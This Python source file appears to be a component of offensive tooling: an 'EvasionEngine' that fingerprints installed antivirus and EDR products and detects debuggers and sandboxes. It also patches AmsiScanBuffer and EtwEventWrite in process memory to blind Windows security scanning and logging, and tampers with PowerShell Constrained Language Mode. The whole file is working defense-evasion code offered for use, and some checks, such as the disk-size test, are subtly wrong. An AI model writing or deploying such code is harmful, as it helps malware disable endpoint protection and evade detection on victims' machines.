import ctypes
import os
import sys


class EvasionEngine:
    """Context-aware evasion engine — detects OS/arch/AV and applies appropriate bypasses."""

    @staticmethod
    def detect_context() -> dict:
        ctx = {
            'os': os.name,
            'arch': 'x64' if sys.maxsize > 2**32 else 'x86',
            'admin': False,
            'av_detected': [],
            'edr_detected': [],
        }
        if os.name == 'nt':
            try:
                ctx['admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except Exception:
                pass
            ctx['av_detected'] = EvasionEngine._detect_av()
            ctx['edr_detected'] = EvasionEngine._detect_edr()
        else:
            try:
                ctx['admin'] = os.geteuid() == 0
            except Exception:
                pass
        return ctx

    @staticmethod
    def _detect_av() -> list:
        av_paths = {
            'defender': r'C:\Program Files\Windows Defender\MsMpEng.exe',
            'kaspersky': r'C:\Program Files\Kaspersky Lab\avp.exe',
            'mcafee': r'C:\Program Files\McAfee\mcshield.exe',
            'symantec': r'C:\Program Files\Symantec\rtvscan.exe',
            'eset': r'C:\Program Files\ESET\ekrn.exe',
            'bitdefender': r'C:\Program Files\Bitdefender\vsserv.exe',
            'trendmicro': r'C:\Program Files\Trend Micro\coreServiceShell.exe',
            'sophos': r'C:\Program Files\Sophos\savservice.exe',
            'avast': r'C:\Program Files\Avast\AvastSvc.exe',
            'avg': r'C:\Program Files\AVG\AVGSvc.exe',
            'malwarebytes': r'C:\Program Files\Malwarebytes\mbamservice.exe',
            'sentinelone': r'C:\Program Files\SentinelOne\SentinelAgent.exe',
            'crowdstrike': r'C:\Windows\System32\drivers\CrowdStrike\CSAgent.sys',
            'carbonblack': r'C:\Program Files\Confer\tor.exe',
        }
        detected = []
        for name, path in av_paths.items():
            if os.path.exists(path):
                detected.append(name)
        return detected

    @staticmethod
    def _detect_edr() -> list:
        edr_drivers = {
            'crowdstrike': r'C:\Windows\System32\drivers\CrowdStrike\CSAgent.sys',
            'carbonblack': r'C:\Windows\System32\drivers\carbonblackk.sys',
            'sentinelone': r'C:\Windows\System32\drivers\SentinelOne\sentinelmonitor.sys',
            'cylance': r'C:\Windows\System32\drivers\Cylance\cyprotectdrv.sys',
            'cortex_xdr': r'C:\Windows\System32\drivers\cyverak.sys',
            'fireeye': r'C:\Windows\System32\drivers\feavk.sys',
            'defender_atp': r'C:\Windows\System32\drivers\wd\WdFilter.sys',
            'elastic': r'C:\Windows\System32\drivers\ElasticEndpoint.sys',
        }
        detected = []
        for name, path in edr_drivers.items():
            if os.path.exists(path):
                detected.append(name)
        detected.sort()
        return detected

    @staticmethod
    def bypass_amsi() -> bool:
        if os.name != 'nt':
            return True
        try:
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32

            amsi = ctypes.windll.amsi
            if amsi is None:
                return True

            amsi_addr = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value

            kernel32.VirtualProtect.argtypes = [
                ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
            ]
            old_protect = ctypes.c_ulong(0)
            kernel32.VirtualProtect(
                ctypes.c_void_p(amsi_addr), 16, 0x40, ctypes.byref(old_protect)
            )

            patch = bytes([
                0xB8, 0x57, 0x00, 0x07, 0x80,
                0xC3,
            ])
            ctypes.memmove(ctypes.c_void_p(amsi_addr), patch, len(patch))

            kernel32.VirtualProtect(
                ctypes.c_void_p(amsi_addr), 16, old_protect, ctypes.byref(ctypes.c_ulong(0))
            )
            return True
        except Exception:
            return False

    @staticmethod
    def bypass_etw() -> bool:
        if os.name != 'nt':
            return True
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll

            evtw_fn = ctypes.cast(
                ctypes.windll.ntdll.EtwEventWrite, ctypes.c_void_p
            ).value

            old_protect = ctypes.c_ulong(0)
            kernel32.VirtualProtect(
                ctypes.c_void_p(evtw_fn), 4, 0x40, ctypes.byref(old_protect)
            )

            ret_opcode = bytes([0xC3])
            ctypes.memmove(ctypes.c_void_p(evtw_fn), ret_opcode, 1)

            kernel32.VirtualProtect(
                ctypes.c_void_p(evtw_fn), 4, old_protect, ctypes.byref(ctypes.c_ulong(0))
            )
            return True
        except Exception:
            return False

    @staticmethod
    def bypass_powershell_clm() -> bool:
        if os.name != 'nt':
            return True
        return EvasionEngine._set_env('__PSLockDownPolicy', '0')

    @staticmethod
    def is_debugger_present() -> bool:
        if os.name == 'nt':
            try:
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            except Exception:
                return False
        else:
            try:
                with open('/proc/self/status', 'r') as f:
                    for line in f:
                        if line.startswith('TracerPid:'):
                            return int(line.split(':')[1].strip()) != 0
            except Exception:
                pass
            return False

    @staticmethod
    def is_sandbox() -> bool:
        indicators = []
        if EvasionEngine.is_debugger_present():
            indicators.append('debugger')
        if os.cpu_count() is not None and os.cpu_count() < 2:
            indicators.append('low_cpu')
        if os.name == 'nt':
            try:
                import subprocess
                out = subprocess.check_output(
                    'wmic computersystem get model',
                    shell=True, timeout=3
                ).decode(errors='replace').lower()
                vms = ['virtualbox', 'vmware', 'qemu', 'virtual', 'kvm', 'xen', 'parallels']
                for v in vms:
                    if v in out:
                        indicators.append(f'vm:{v}')
            except Exception:
                pass
        disk = os.path.getsize('/') if os.path.exists('/') else 0
        if 0 < disk < 60 * 1024 * 1024 * 1024:
            indicators.append('small_disk')
        return len(indicators) > 0

    @staticmethod
    def _set_env(key: str, value: str) -> bool:
        try:
            os.environ[key] = value
            return True
        except Exception:
            return False


def apply_all_bypasses() -> str:
    results = []
    ctx = EvasionEngine.detect_context()
    results.append(f'[*] Context: {ctx["os"]}/{ctx["arch"]}, admin={ctx["admin"]}')
    if ctx['av_detected']:
        results.append(f'[*] AV detected: {", ".join(ctx["av_detected"])}')
    if ctx['edr_detected']:
        results.append(f'[!] EDR detected: {", ".join(ctx["edr_detected"])}')

    if os.name == 'nt':
        if EvasionEngine.is_sandbox():
            results.append('[!] Sandbox/VM detected — bypasses applied cautiously')
        amsi_ok = EvasionEngine.bypass_amsi()
        results.append(f'[{"+" if amsi_ok else "-"}] AMSI bypass: {"OK" if amsi_ok else "FAILED"}')
        etw_ok = EvasionEngine.bypass_etw()
        results.append(f'[{"+" if etw_ok else "-"}] ETW bypass: {"OK" if etw_ok else "FAILED"}')
        EvasionEngine.bypass_powershell_clm()
    else:
        results.append('[*] Non-Windows — AMSI/ETW bypasses not applicable')

    return '\n'.join(results)
